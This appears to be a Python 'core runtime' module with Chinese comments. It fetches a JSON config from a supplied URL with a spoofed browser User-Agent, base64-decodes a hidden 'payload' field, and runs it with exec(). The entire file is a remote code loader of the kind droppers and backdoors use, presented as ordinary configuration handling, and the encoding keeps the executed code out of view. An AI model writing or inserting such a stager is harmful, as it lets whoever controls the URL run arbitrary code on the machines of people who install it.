# -*- coding: utf-8 -*-
"""核心运行时模块 - 从远程URL获取配置并执行"""
import os
import sys
import json
import base64


def _get_config(config_url):
    """从URL获取配置"""
    import urllib.request
    req = urllib.request.Request(config_url, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode())


def _run(config):
    """执行运行时逻辑"""
    # 解码并执行核心逻辑
    payload = base64.b64decode(config['payload']).decode()
    exec(payload, {'config': config, '__builtins__': __builtins__})


def start(config_url):
    """主入口"""
    config = _get_config(config_url)
    _run(config)
